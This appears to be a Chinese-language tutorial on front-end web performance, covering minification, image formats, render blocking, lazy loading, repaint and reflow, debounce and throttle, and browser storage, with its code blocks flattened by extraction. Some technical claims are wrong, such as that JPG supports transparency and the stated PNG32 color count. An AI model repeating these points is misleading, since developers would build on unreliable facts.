无效代码的压缩； css语义合并； 如何进行css压缩 使用在线网站进行压缩； 使用html-minifier对html中的css进行压缩； 使用clean-css对css进行压缩； 3.js压缩与混乱（丑化）包括： 无效字符的删除（空格，回车等）； 剔除注释； 代码语义的缩减和优化； 代码保护（如果代码不经处理，客户端可直接窥探代码漏洞）； JS压缩与混乱（丑化） 使用在线网站进行压缩：https://tool.oschina.net/jscompress/ 使用html-minifier对html中的js进行压缩； 使用uglify.js2对js进行压缩； 4.文件合并文件合并的好处： 左边的表示使用http长链接keep-alive但不合并请求的情况，需要分三次去获取a.js、b.js、c.js；右边是使用长链接并且合并请求的情况，只需要发送一次获取合并文件a-b-c.js的请求，就能将三个文件都请求回来。 不合并请求有下列缺点： 文件与文件之间有插入的上行请求，会增加N-1个网络延迟； 受丢包问题的影响更严重：因为每次请求都可能出现丢包的情况，减少请求能有效减少丢包情况； keep-alive本身也存在问题：经过代理服务器时可能会被断开； 文件合并存在的问题 首屏渲染问题：当请求js文件的时候，如果页面渲染只依赖a.js文件，由于文件合并，需要等待合并后的a-b-c.js文件请求回来才能继续渲染，这样就会导致页面渲染速度变慢。这种情况大多出现在现代化的前端框架，如Vue等的使用过程中； 缓存失效问题：合并后的文件a-b-c.js中只要其中一个文件（比如a.js）发生变化，那么整个合并文件都将失效，而不采用文件合并就不会出现这种情况； 使用建议 公共库合并：将不经常发生变化的公共组件库文件进行合并； 将不同页面的js文件单独合并：比如在单页面应用SPA中，当路由跳转到具体的页面时才请求该页面需要的js文件； 如何进行文件合并 使用在线网站进行文件合并； 使用nodejs实现文件合并； 使用webpack等前端构件化工具也可以很好地实现； 二、图片相关的优化有损压缩过程： 一张JPG图片的解析分别要进行： 颜色空间的转换：从RGB的颜色空间转到其他的颜色空间 ； 进行重采样：区分高频和低频的颜色变换； 进行DCT过程：对高频的颜色采样结果进行压缩，这样压缩的收益会比较大； 再对数据进行量化； 最后进行编码（encoding）； 最终得到JPEG-Compressed Image Data，即真正显示出来的JPG图片。虽然这是一种有损压缩，但是很多情况下，这些损失的数据并不影响显示； png8/png24/png32之间的区别 png8：256色 + 支持透明； png24：2^24色 + 不支持透明； png32：2^32色 + 支持透明； 不同格式图片常用的业务场景 jpg有损压缩，压缩率高，支持透明；应用：大部分不需要透明图片的业务场景； png支持透明，浏览器兼容好；应用：大部分需要透明图片的业务场景； webp（2010年由谷歌推出）压缩程度更好，在ios webview中有兼容性问题；应用：安卓全部； svg矢量图，代码内嵌，相对较小，用于图片样式相对简单的场景；应用：比如logo和iconfont； 1.图片压缩针对真实图片情况，舍弃一些相对无关紧要的色彩信息，对图片进行压缩；比如在线压缩网站：https://tinypng.com/ 2.css雪碧图将网站上用到的一些图片整合到一张单独的图片中，从而减少网站HTTP请求数量。原理为：设定整张雪碧图可示区域，将想要显示的图标定位到该处（左上角）；缺点：整合图片比较大时，一次加载比较慢。 如天猫的雪碧图： 很多情况下，并不是所有的小图标都放在一张雪碧图中，而是会适当进行拆分。现在使用雪碧图的场景比较少了。 自动生成雪碧图样式的网站：http://www.spritecow.com/ 选中雪碧图中对应的图标，就会生成对应的样式。 3.网页内联图片（Image inline）将图片的内容内嵌到html当中，减少网站的HTTP请求数量，常用于处理小图标和背景图片。网页内联图片写法为： 1&lt;imgsrc=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA...&quot;alt=&quot;&quot;&gt; 浏览器上的表现形式为： 这里提供一个将：image 转 DataUrI的网址：http://tool.c7sky.com/datauri/ 缺点： 浏览器不会缓存内联图片资源； 兼容性较差，只支持ie8以上浏览器； 超过1000kb的图片，base64编码会使图片大小增大，导致网页整体下载速度减慢； 所以要根据场景使用，不过内联图片减少HTTP请求的优点还是很显著的。比如，在开发中小于4KB或8KB的图片都会通过构建工具自动inline到HTML中，这种情况下Image inline带来的图片大小增长其实是比增加HTTP请求次数更优的。 4.矢量图SVG与iconfont使用iconfont解决icon问题 应尽量使用该方式，比如可以采用阿里巴巴矢量图库： 可以选择格式进行下载： 可以看到它们的大小有着明显的差异： 使用SVG进行矢量图的控制 SVG意为可缩放矢量图形（Scalable Vector Graphics）。SVG 使用 XML 格式定义图像。下为示例： 在线转换网站：http://www.bejson.com/convert/image_to_svg/ 5.webpwebp的优势体现在它具有更优的图像压缩算法，能带来更小的图片体积，而且拥有肉眼识别无差异的图像质量；同时具备了无损和有损的压缩模式、Alpha透明以及动画的特性。在JPEG和PNG上的转化效果都非常优秀、稳定和统一。安卓上不存在兼容性问题，推荐安卓下使用。 以下为淘宝网首页请求的图片： 可以看到，图片中大量地添加了webp格式的选择。.jpg_.webp表示当浏览器支持webp时采用webp格式，否则采用jpg格式。 下面为B站首页的图片，可以看到基本都采用了webp格式： 同一张图片jpg格式和webp格式压缩率有着明显的差异： 可以通过在线网站将图片转换为webp：https://zhitu.isux.us/ 像图片这样的静态文件可以存放在CDN服务器上，让CDN服务器批量地将图片转换成Webp格式； 三、浏览器渲染引擎与阻塞1.渲染的主要模块版本一： 版本二： 一个渲染引擎主要包括：HTML解析器，CSS解析器，javascript引擎，布局layout模块，绘图模块： HTML解析器：解释HTML文档的解析器，主要作用是将HTML文本解释成DOM树； CSS解析器：它的作用是为DOM中的各个元素对象计算出样式信息，为布局提供基础设施； Javascript引擎：使用Javascript代码可以修改网页的内容，也能修改css的信息，javascript引擎能够解释javascript代码，并通过DOM接口和CSS树接口来修改网页内容和样式信息，从而改变渲染的结果； 布局（layout）：在DOM创建之后，Webkit需要将其中的元素对象同样式信息结合起来，计算他们的大小位置等布局信息，形成一个能表达这所有信息的内部表示模型； 绘图模块（paint）：使用图形库将布局计算后的各个网页的节点绘制成图像结果； 2.渲染过程浏览器渲染页面的整个过程：浏览器会从上到下解析文档。 浏览器解析时遇见 HTML 标记，就会调用HTML解析器解析为对应的 token （一个token就是一个标签文本的序列化）并构建 DOM 树（就是一块内存，保存着tokens，建立它们之间的关系）。在生成DOM的最开始阶段（应该是Bytes → characters后），并行发起css、图片、js的请求，无论他们是否在HEAD标签中。 注意：发起js文件的下载请求（request）并不需要DOM处理到那个script节点； 遇见 style/link 标记 调用解析器 处理 CSS 标记并构建 CSS样式树； 遇见 script 标记 调用 javascript解析器处理script标记，绑定事件、修改DOM树/CSS树等； 将 DOM树 与 CSS树 合并成一棵渲染树（Render Tree）。 布局（Layout）：根据渲染树中各节点的样式和依赖关系，计算出每个节点在屏幕中的位置； 绘图（Painting）：按照计算出来的结果：要显示的节点、节点的CSS与位置信息，通过显卡，把内容画到屏幕上； 经过第一次Painting之后DOM、CSSOM、Render Tree都可能会被多次更新，比如JS修改了DOM或者CSS属性时，Layout和Painting就会被重复执行。除了DOM、CSSOM更新的原因外，图片下载完成后也需要调用Layout 和 Painting来更新网页。 补充： \\1. HTML中可能会引入很多的css、js这样的外部资源，这些外部资源在浏览器端是并发加载的。但是浏览器会对同一域名进行并发数量（度）的限制，即单个域名的并发度是有限的； \\2. 所以，经常将大部分的资源托管到CDN服务器上，并且设置3~4个CDN域名。防止只有一个CDN域名的情况下，达到了浏览器外部资源并发请求数目的上限，导致很多资源无法做到并发请求。所以，应设置多个CDN域名； 3.css阻塞只有通过link引入的外部css才会产生阻塞： style标签中的样式： 由html解析器进行解析； 不阻塞浏览器渲染（可能会产生“闪屏现象”）； 不阻塞DOM解析； link引入的外部css样式（推荐使用的方式）： 由CSS解析器进行解析； 阻塞浏览器渲染：由于css已经加载完毕，所以整个渲染过程是带样式的，所以这种阻塞可以避免“闪屏现象”； 阻塞其后面的js语句的执行：这个不难理解，js文件中经常会出现DOM操作，操作过程中有可能涉及到css样式的修改。实际上，这些修改往往是依赖于之前引入的css设定的样式的，所以css会阻塞js的执行； 不阻塞DOM的解析； 优化核心理念：尽可能快的提高外部css加载速度： 使用CDN节点进行外部资源加速； 对css进行压缩(利用打包工具，比如webpack，gulp等)； 减少http请求数，将多个css文件合并； 优化样式表的代码； 4.js阻塞 阻塞DOM解析: 原因：浏览器不知道后续脚本的内容，如果先去解析了下面的DOM，而随后的js删除了后面所有的DOM，那么浏览器就做了无用功，浏览器无法预估脚本里面具体做了什么操作，例如像document.write这种操作，索性全部停住，等脚本执行完了，浏览器再继续向下解析DOM；可以通过给script标签添加defer和async属性，异步引入js文件，以此来解决这一问题。 阻塞页面渲染: 原因：js中也可以给DOM设置样式，浏览器同样等该脚本执行完毕，再继续干活，避免做无用功； 阻塞后续js的执行: 原因：js是按顺序执行的，这样可以维护依赖关系，例如：必须先引入jQuery再引入bootstrap； 不阻塞资源的加载： 这并不与上面矛盾，因为不可能由于加载一个js文件就把其他资源的加载都阻塞了。针对这种常见的情况，浏览器会通过预加载的方式加载后续的资源； 5.总结 css的解析和js的执行是互斥的（互相排斥），css解析的时候js停止执行，js执行的时候css停止解析； 无论css阻塞，还是js阻塞，都不会阻塞浏览器加载外部资源（图片、视频、样式、脚本等）； 因为览器始终处于一种：“先把请求发出去”的工作模式，只要是涉及到网络请求的内容，无论是：图片、样式、脚本，都会先发送请求去获取资源，至于资源到本地之后什么时候用，由浏览器自己协调。显然这种做法效率很高； WebKit 和Firefox 都进行了【预解析】这项优化。在执行js脚本时，浏览器的其他线程会解析文档的其余部分，找出并加载需要通过网络加载的其他资源。通过这种方式，资源可以在并行连接上加载，从而提高总体速度。请注意，预解析器不会修改 DOM 树 四、懒加载和预加载1.懒加载图片进入可视区域之后再请求图片资源的方式称为图片懒加载。适用于图片很多，页面很长的业务场景，比如电商； 懒加载的作用： 减少无效资源的加载： 比如一个网站有十页图片，用户只查看了第一页的图片，这就没必要将十页图片全都加载出来； 并发加载的资源过多会阻塞js的加载，影响网站正常的使用： 由于浏览器对某一个host name是有并发度上限的，如果图片资源所在的CDN和静态资源所在的CDN是同一个的话，过多图片的并发加载就会阻塞后续js文件的并发加载。 懒加载实现的原理： 监听onscroll事件，判断可视区域位置： 图片的加载是依赖于src路径的，首先可以为所有懒加载的静态资源添加自定义属性字段，用于存储真实的url。比如是图片的话，可以定义data-src属性存储真实的图片地址，src指向loading的图片或占位符。然后当资源进入视口的时候，才将src属性值替换成data-src中存放的真实url。 1&lt;img src=&quot;&quot; class=&quot;image-item&quot; alt=&quot;&quot; lazyload = &quot;true&quot; data-src=&quot;TB27YQvbm_I8KJjy0FoXXaFnVXa_!!400677031.jpg_180x180xzq90.jpg_.webp&quot;&gt; 懒加载实例 可以使用元素的getBoundingClientRect().top来判断当前位置是否在视口内，也可以使用元素距离文档顶部的距离offsetTop和scrollTop是否小于视口高度来判断： 下面是我针对getBoundingClientRect的补充getBoundingClientRect 有四个属性 top - 获取到的是元素上边框到浏览器顶部的距离，包含html和body的边框及margin，padding bottom - 获取到的是元素下边框到浏览器顶部的距离，包含html和body的边框及margin，padding left - 获取到的是元素左边框到浏览器左边的距离，包含html和body的边框及margin，padding right - 获取到的是元素右边框到浏览器左边的距离，包含html和body的边框及margin，padding 举例 比如手机淘宝首页： 当快要滚动到需要展示的图片时才进行图片的请求，可以看到图片上有一个lazyload的属性： 2.预加载预加载与懒加载正好是相反的过程：懒加载实际上是延迟加载，将我们所需的静态资源加载时间延后；而预加载是将图片等静态资源在使用之前的提前请求，这样资源在使用到时能从缓存中直接加载，从而提升用户体验； 预加载的作用： 提前请求资源，提升加载速度：使用时只需要读取浏览器缓存中提前请求到的资源即可； 维护页面的依赖关系：比如WebGL页面，会依赖一些3D模型，这些都是页面渲染所必须的资源。如果资源都没有加载完毕就进行页面的渲染，就会造成非常不好的体验。 所以时常使用预加载的方式维护页面渲染的依赖关系，比如将WebGL页面依赖的3D模型加载完之后才进行页面渲染。这样渲染的过程就不会有任何阻碍，具有较好的用户体验； 预加载的实例 例如九宫格抽奖业务，每个奖品都有一个选中态和非选中态，实际上这是由两张图片组合而成的。由于每个奖品的选中过程都是一瞬间，这就对图片的选中态和非选中态切换效率要求很高，如果选中态的图片没有预加载的话显然是来不及的。 所以，实际上对于九宫格中所有图片选中态的样式和对应的图片都需要进行预加载，从而让我们在抽奖的过程中，能够瞬间从缓存中读取到选中态的图片，从而不影响抽奖效果的展示。 除此之外还有网站登录或活动时需要用到的动画，这是在动画需要的每帧图片都完全预加载完之后才会进行显示的。 五、重绘与回流1.CSS图层浏览器在渲染一个页面时，会将页面分为很多个图层，图层有大有小，每个图层上有一个或多个节点。在渲染 DOM的时候，浏览器所做的工作实际上是： 1、获取DOM后分割为多个图层； 2、对每个图层的节点计算样式结果（Recalculate style–样式重计算）； 3、为每个节点生成图形和位置（Layout–回流和重布局）； 4、将每个节点绘制填充到图层位图中（Paint Setup和Paint–重绘）； 5、图层作为纹理上传至GUI； 6、复合多个图层到页面上生成最终屏幕图像（Composive Layers–图层重组）； 2.创建图层的条件 拥有3D或透视变换的css属性（prespective transform ）； 使用加速视频解码的&lt;video&gt;节点； 拥有3D(WebGL)上下文或加速的2D上下文的&lt;canvas&gt;节点； CSS3动画的插件（如Flash）； 拥有加速css过滤器的元素； transform：如translateZ(0) opacity filter will-change：哪一个属性即将发生变化，进而进行优化。 下面是本人针对will-change的一些补充 不要使用will-change声明对太多属性或元素的更改 给浏览器足够的时间来工作，不要对已经发生的变化进行优化 变更生效之后移除掉will-change 最好使用js来进行属性的赋值和移除 有选择的在css中使用will-change 用于反复交互或者不断变化的元素 3.重绘（Repaint）重绘是一个元素外观的改变所触发的浏览器行为，比如background-color、outline等属性。这些属性不影响布局，只影响元素的外观，风格，会造成DOM元素的重新渲染，这个过程称为重绘。 需要注意的是：重绘是以图层为单位，如果图层中某个元素需要重绘，那么整个图层都需要重绘。比如一个图层包含很多节点，其中有个gif图，gif图的每一帧，都会重回整个图层的其他节点，然后生成最终的图层位图。 因此，可以通过特殊的方式来强制gif图单独为一个图层（translateZ(0)或者translate3d(0,0,0)；CSS3的动画也是一样（好在绝大部分情况浏览器自己会为CSS3动画的节点创建图层）； 所以：将频繁重绘回流的DOM元素作为一个独立图层，那么这个DOM元素的重绘和回流只会该图层；原则上是要尽量避免新建图层的，因为这会导致图层重组（Composive Layers）时候的计算量增大。所以，只有当某些DOM元素频繁重绘回流时，才新建一个独立图层放置它们； 只会触发重绘的属性 12345678910111213141516//部分属性colorborder-styleborder-radiusvisibilitytext-decorationbackgroundbackground-imagebackground-positionbackground-repeatbackground-sizeoutline-coloroutlineoutline-styleoutline-widthbox-shadow 4.回流（Reflow）当render tree中的一部分（或全部）因为元素的规模尺寸，布局，隐藏等改变而需要重新构建。这就称为回流（reflow）； 当页面布局和几何属性改变时就需要回流； 回流必将引起重绘，而重绘不一定会引起回流； 触发页面重布局（回流）的属性 频繁触发重绘和回流，会导致UI频繁渲染。在渲染的过程中由于阻塞了js线程的执行，最终导致js执行变慢。 5.触发回流的常见操作 增加、删除、修改 DOM 结点； 移动 DOM 的位置； 修改 CSS 样式； Resize 窗口；移动端没有这个问题，因为移动端的缩放没有影响布局视口（vw/vh）； 修改网页的默认字体； 获取某些DOM元素的属性(width，height等)； 注：display：none 会触发 Reflow，而visibility：hidden 只会触发 Repaint，因为没有发生位置变化； 6.示例案例一：淘宝轮播图 可以使用Chrome浏览器调试工具的Performance来观察淘宝首页一个轮播图引起的重绘回流过程： Update Layer Tree回流和重布局： Paint重绘： Composite Layers图层重组： 案例二：播放器 通过Chrome调试工具的Layers选项查看图层，及新增图层的原因： 视频播放的过程中，video标签的DOM元素会一直重绘，所以把它限制在一个图层上是非常好的，这样只会涉及到这个图层的重绘，而不会影响其他图层的元素。 图层不能滥用，否则会在图层重组的过程中严重消耗性能！ 比如可以将淘宝首页的所有的DOM元素都变为一个图层：在html标签中的全局样式（*）中添加transform:translateZ(0)来触发新建图层： 还可以通过添加：will-change: transform属性新建图层； 再次查看此时的图层情况，可以看到此时首页的图层非常之多，十分地卡： 7.实战优化点如果我们需要使得动画或其他节点渲染的性能提高，需要做的就是减少浏览器在运行时所需要做的下列工作： 计算需要被加载到节点上的样式结果（Recalculate style–样式重计算）； 为每个节点生成图形和位置（Layout–回流和重布局）； 将每个节点填充到图层中（Paint Setup和Paint–重绘）； 组合图层到页面上（Composite Layers–图层重组）； 1、使用translate替代top等属性来改变位置； 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;htmllang=&quot;en&quot;&gt;&lt;head&gt; &lt;metacharset=&quot;UTF-8&quot;&gt; &lt;metaname=&quot;viewport&quot;content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; #box&#123; /*方法1*/ position: relative; top: 0; /*方法2*/ /* transform: translateY(0); */ width: 200px; height: 200px; background-color: pink; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;divid=&quot;box&quot;&gt;&lt;/div&gt; &lt;script&gt; setTimeout(() =&gt; &#123; document.getElementById(&quot;box&quot;).style.top = &#x27;100px&#x27; //document.getElementById(&quot;box&quot;).style.transform = &#x27;translateY(100px)&#x27; &#125;, 2000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 使用top属性改变正方形位置时，存在重绘和回流Layout： 而使用translate属性改变正方形位置时，并不会引起重绘和回流： 比如有的网站会有一些左右飘动的浮窗，由于这些浮窗是采用定时器来实现的，如果每经过100ms就改变浮窗的位置。这种时候使用transform来替代top/left的话1s内就减少了十次回流，十分有利于网页速度的提升。 2、使用opacity替代visibility： 使用visibility不触发重排，但是依然重绘； 直接使用opacity既触发重绘，又触发重排（GPU底层设计如此！）； opacity配合图层使用，既不触发重绘也不触发重排； 原因：透明度的改变时，GPU在绘画时只是简单的降低之前已经画好的纹理的alpha值来达到效果，并不需要整体的重绘。不过这个前提是这个被修改opacity本身必须是一个单独的图层。 3、将多次改变DOM元素样式属性的操作合并成一次操作： 预先定义好class，然后通过修改DOM的className来添加样式； 4、把DOM离线后再修改： 由于display属性为none的元素不在渲染树中，对隐藏的元素操作不会引发其他元素的重排。如果要对一个元素进行复杂的操作时，可以先隐藏它，操作完成后再显示。这样只在隐藏和显示时触发2次回流； 5、不要把获取某些DOM节点的属性值放在一个循环里当成循环的变量 当向浏览器请求某些 style信息的时候，浏览器就会清空（flush）队列，比如： ffsetTop，offsetLeft，offsetWidth，offsetHeight； scrollTop/Left/Width/Height； clientTop/Left/Width/Height； width，height； 浏览器为了获取最精确的值，需要刷新内部队列。因为队列中可能存在影响到这些值的操作，即使没有，浏览器也会强行刷新渲染队列。这样就无法利用渲染队列的缓存来避免回流过于频繁了，所以在使用到DOM元素这些相关的属性时，可以将获取到的属性值存在一个变量中，而不是每次都去重新获取。 6、不要使用table布局： 因为很小的一个改动都会造成整个table的重新布局；所以尽量使用div布局； 7、启用GPU硬件加速： 原理为：浏览器会检测一些特定的css属性，当DOM元素拥有这些css属性的时候，浏览器就会对该DOM元素启动GPU硬件加速；比如：transform: translateZ(0)和transform: translate3d(0, 0, 0)这两个属性都可以启动硬件加速；硬件加速同样不能滥用，否则会导致图层过多，导致合并图层时消耗大量性能。 8、动画实现速度的选择： 因为动画的每次变化都会引起重绘和回流，所以要根据业务场景适当地在动画帧数（顺畅程度）和回流次数中进行平衡； 9、为动画元素新建图层，提高动画元素的z-index； 10、利用文档碎片(documentFragment)——vue使用了该种方式提升性能 如果我们要在一个ul中添加10000个li，如果不使用文档碎片，那么我们就需要使用append进行10000次的追加，这会导致页面不停地回流，非常地消耗资源： 1234567var oUl = document.createElement(&quot;ul&quot;); for(var i=0;i&lt;10000;i++)&#123; var oLi = document.createElement(&quot;li&quot;); oUl.appendChild(oLi); &#125; document.body.appendChild(oUl); 我们可以引入createDocumentFragment()方法，它的作用是创建一个文档碎片。先将要插入10000个li添加到文档碎片里，然后再一次性添加到document中。即文档碎片相当于一个临时仓库，这样能够大量减少DOM操作： 12345678910111213141516//先创建文档碎片var oFragment = document.createDocumentFragment(); //再创建ul标签var oUl = document.createElement(&quot;ul&quot;); for(var i=0;i&lt;10000;i++)&#123; //创建li标签 var oLi = document.createElement(&quot;li&quot;); //先附加在文档碎片中 oFragment.appendChild(oLi); &#125;//将文档碎片添加到ul标签中 oUl.appendChild(oFragment);//将ul标签添加到body标签中document.body.appendChild(oUl); 11、如果涉及到一些可以使用合成线程来处理 CSS 特效或者动画的情况，就尽量使用 will-change 来提前告诉渲染引擎，让它为该元素准备独立的层。 12、采用虚拟DOM； 13、使用requestAnimationFrame制作动画：详细内容如下。 8.请求动画帧（requestAnimationFrame）window.requestAnimationFrame() ：该方法会告诉浏览器在重绘之前调用指定的函数： 参数：该方法以一个回调函数作为参数，这个回调函数会在浏览器重绘之前被调用； 回调函数会被自动传入一个参数：DOMHighResTimeStamp，标识requestAnimationFrame()开始触发回调函数的当前时间； 返回值： 一个非零的整数，也称为请求ID，是回调列表中唯一的标识，没有其他意义； window.cancelAnimationFrame(requestID)：该方法取消一个先前通过调用window.requestAnimationFrame()方法添加到计划中的动画帧请求。requestID是先前调用window.requestAnimationFrame()方法时返回的ID。 用途 当无法使用CSS3制作动画的情况下，使用这种方法替代定时器制作动画； 由于重绘就调用的机制，制作的动画频率与浏览器的刷新频率一致，不会出现闪动，保证了动画的流畅； 示例 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; #box&#123; height: 200px; width: 200px; background-color: pink; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;box&quot;&gt;&lt;/div&gt; &lt;script&gt; let i = 0 //获取请求ID let id = requestAnimationFrame(move) function move()&#123; i++ document.getElementById(&#x27;box&#x27;).style.transform = `translateX($&#123;i&#125;px)` //递归调用requestAnimationFrame,更新请求ID,实现动画效果 id = requestAnimationFrame(move) &#125; setTimeout(() =&gt; &#123; //2s后停止动画 cancelAnimationFrame(id) &#125;, 2000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 六、函数防抖与节流1.函数防抖 概念：不断触发一个函数，在规定时间内只让最后一次生效，前面都不生效； 实现：定时器； 应用：搜索时等用户完整输入内容后再发送查询请求； 代码实现 1234567891011function debounce(fn,delay)&#123; var timer = null // 清除上一次延时器 return function()&#123; clearTimeout(timer) // 重新设置一个新的延时器 timer = setTimeout(() =&gt; &#123; fn.call(this) &#125;, delay); &#125; &#125; 使用函数防抖可以减少事件触发的次数和频率，在某些情况下可以起到优化的作用。比如：搜索框，对于核心业务非搜索的网站，一般都是等待用户完整输入内容后才发送查询请求，一次来减少服务器的压力。像百度这样的核心业务为搜索的网站，服务器性能足够强大，所以不进行函数防抖处理； 2.函数节流 概念：不断触发一个函数后，执行第一次，只有大于设定的执行周期后才会执行第二次，以此控制函数执行频率； 实现：定时器，标识； 应用：在游戏中，可以设定人物攻击动作的最快频率，无论手速多快也无法超越这一频率； 代码实现 123456789101112131415161718/* 节流函数：fn:要被节流的函数，delay：规定的时间 */functionthrottle(fn, delay)&#123; // 记录上一次函数出发的时间 var lastTime = 0 return function()&#123; // 记录当前函数触发的时间 var nowTime = new Date().getTime() // 当当前时间减去上一次执行时间大于这个指定间隔时间才让他触发这个函数 if(nowTime - lastTime &gt; delay)&#123; // 绑定this指向 fn.call(this) //同步时间 lastTime = nowTime &#125; &#125;&#125; 七、浏览器存储1.Cookie Cookie翻译过来是小甜饼的意思，是网景公司的前雇员 Lou Montulli 在1993年3月发明的； Cookie是纯文本格式，不包含任何可执行的代码信息，伴随着用户请求在 Web 服务器和浏览器之间传递； Cookie本质上属于http的范畴，因为http协议本身是无状态的，服务端是没有办法区分请求来自于哪个客户端，即便是来自于同一个客户端的多次请求，服务端也无法进行区分。所以引入了Cookie去维持客户端的状态（比如每个账号的购物车状态都不一样）。 Cookie的生成方式 客户端生成： 在 JavaScript 中通过 document.cookie 属性，你可以创建、维护和删除 Cookie；设置 document.cookie 属性的值并不会删除存储在页面中的所有 Cookie，它只简单的创建或修改字符串中指定的 Cookie。 服务端生成： Web 服务器通过在HTTP响应头中添加 Set-Cookie字段来创建一个 Cookie，可以在该字段中添加HttpOnly属性禁止JavaScript脚本访问Cookie，以此来避免跨域脚本 (XSS) 攻击。 Cookie的缺陷 安全性：由于Cookie在HTTP中是明文传递的，其中包含的数据都可以被他人访问，出现篡改、盗用等问题； 大小限制：Cookie的大小限制在4KB左右，若要做大量存储显然不是理想的选择； 增加流量：因为Cookie是绑定域名对应的服务器的，所以对同一个域名的每次请求都会在Request Header中带上Cookie。 一方面：增加对服务器的请求时间； 另一方面：导致大部分不需要用到Cookie信息的场合下流量的浪费；这样浏览器对同一域名的每一次请求都会多出4KB流量，对于大型网站来说这是很大的损耗。 因此要慎用Cookie，不要在Cookie中存储重要和敏感的数据。 Cookie性能优化的方法 将存放静态资源的CDN服务器域名与主站的域名独立开来。这样每次请求静态文件的时候就不需要携带Cookie，从而可以节省很多流量。 举例 比如在百度进行登录的时候，请求头里面就会有Set-Cookie字段，其中的BDUSS就是标识用户登录状态的字符串： Set-Cookie中的httponly属性表示的是禁止js脚本访问cookie，这样能够一定程度防范XSS攻击； 在Chrome调试工具的Application选项中查看Cookies信息，可以发现该Cookie已经被网站“种”到Domain：.baidu.com这个域名下了，并且该Cookie也设置了HttpOnly属性： 此后浏览器的每次请求都会在请求头Request Headers中携带这一Cookie信息。刷新页面后可以看到，请求头中携带了Cookie信息BDUSS： 这样服务器就知道这是已经登录的用户了。 但是不是所有的请求都需要携带Cookie信息，比如优酷： 可以看到请求index.css文件时也携带了Cookie，但是这是不必要的，这就会导致流量的浪费。 解决方法就是上面所说的：将CDN域名和主域名独立出来； 百度就是这样解决的： 可以看到请求这个静态资源的url并不是.baidu.com，而是静态资源服务器CDN；并且该请求的请求头中不会携带Cookie信息： 设置和获取Cookie 设置Cookie的方式很简单，key和value值通过等号连接： 1document.cookie = &quot;userName=zhangsan&quot; 打开Application选项查看当前Cookie，可以看到Cookie已被改变： 获取Cookie： 1document.cookie 备注： \\1. 静态资源是不会携带Cookie的； \\2. Cookie一般都是后台种的，很少让前端来直接写； \\3. Cookie分:持久级别、session级别； \\4. Cookie一般用于存放session ID与服务器端进行通信； 2.Web Storage Web Storage分为SessionStorage和LocalStorage专门用于客户端浏览器的本地存储，同时空间比Cookie大很多，一般支持5-10M； 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制； LocalStorageLocalStorage是HTML5设计出来专门用于存储浏览器信息的： 大小为5~10M左右； 仅在客户端中使用，不和服务端进行通信； 接口封装较好，提供了js进行读写等操作的API； 采用浏览器本地缓存方案，可直接使用浏览器本地缓存，提升网页渲染的速度； 举例 比如通过Chrome调试工具的Application选项可以查看淘宝中LocalStorage存储的数据： 这些数据只要不手动清除，即使关闭页面也都会存在。当需要使用图片、js/css文件等资源时就不用重新向服务器发出请求，而是可以直接使用LocalStorage中的缓存，这就是LocalStorage缓存的优势； 而Cookie就不一样了，里面存储的数据都是要带到服务器端的，例如用户登录状态，统计信息等数据： 设置和获取LocalStorage LocalStorage提供了相对简单的API，采用的也是key和value的形式。 设置时通过： 1localStorage.setItem(&quot;key&quot;, &quot;value&quot;) 查看LocalStorage，同样设置成功了： 获取时通过： 1localStorage.getItem(&quot;key&quot;) 其他方法 12345//该方法接受一个键名作为参数，并把该键名从存储中删除。localStorage.removeItem(&#x27;key&#x27;); //调用该方法会清空存储中的所有键名localStorage.clear(); SessionStorageSessionStorage用于存储浏览器的会话信息，标签页关闭之后它存储的数据就会被清空，而LocalStorage的数据不会被清空，这是二者的区别： 大小为5~10M左右； 仅在客户端使用，不和服务端进行通信； 接口封装较好； 可对表单信息进行维护；比如添加表单过程中进行了刷新，可以将刷新前填写的信息写入SessionStorage中，这样即使刷新后数据也不会丢失；还有一种场景：分页的表单在进行前进或后退时，如果将信息保存在SessionStorage中就不会丢失； 设置和获取SessionStorage 设置SessionStorage的方法与设置LocalStorage的方法类似： 12345//设置sessionStorage.setItem(&quot;key&quot;, &quot;value&quot;)//获取sessionStorage.getItem(&quot;key&quot;) 通过Application选项查看SessionStorage，可见已成功修改： 其他方法 12345//该方法接受一个键名作为参数，并把该键名从存储中删除。sessionStorage.removeItem(&#x27;key&#x27;); //调用该方法会清空存储中的所有键名sessionStorage.clear(); 3.IndexedDBIndexedDB是浏览器提供的一种API，用于存储客户端中大量的结构化数据。该API使用索引来实现对数据的高性能搜索。虽然WebStorage对于存储较少量的数据时很有用（采用key/value的方式），但对于存储更大量的结构化数据来说，还是IndexedDB表现更加优异。 IndexedDB的应用 为应用创建离线版本； 可以在浏览器中打印indexedDB对象： 4.PWAPWA（Progressive Web Apps）是一种Web App新模型（标准），并不是具体指某一种前沿的技术或者某一个单一的知识点。从英文缩写就能看出，这是一个渐进式的Web App，是通过一系列新的Web特性，配合优秀的UI交互设计，逐步增强用户的体验； PWA的要求 可靠：在没有网络的环境中也能提供基本的页面访问，而不会出现”未连接到互联网”的情况； 快速：针对网页渲染及网络数据访问有较好优化； 融入（Engaging）：应用可以被增加到手机桌面，并且和普通应用一样有全屏、推送等特性； 5.Service WorkerService Worker是一个脚本，可以使浏览器独立于当前网页，在后台运行。为实现一些不依赖页面或者用户交互的特性打开了一扇大门。在未来这些特性将包括推送信息，背景后台同步，geofencing（地理围栏定位）等它将推出的第一个首要特性，就是拦截和处理网络请求的能力，包括以编程方式来管理被缓存的响应。 即Service Worker可以帮助浏览器执行大规模的运算而不阻碍主线程的执行。 Service Worker的应用 使用拦截和处理网络请求的能力，实现一个离线应用； 使用Service Worker在后台运行的同时能和页面通信的能力，去实现大规模后台数据的处理； Service Worker应用过程 示例 通过Chrome调试工具的Application选项可以查看淘宝的Service Workers信息： 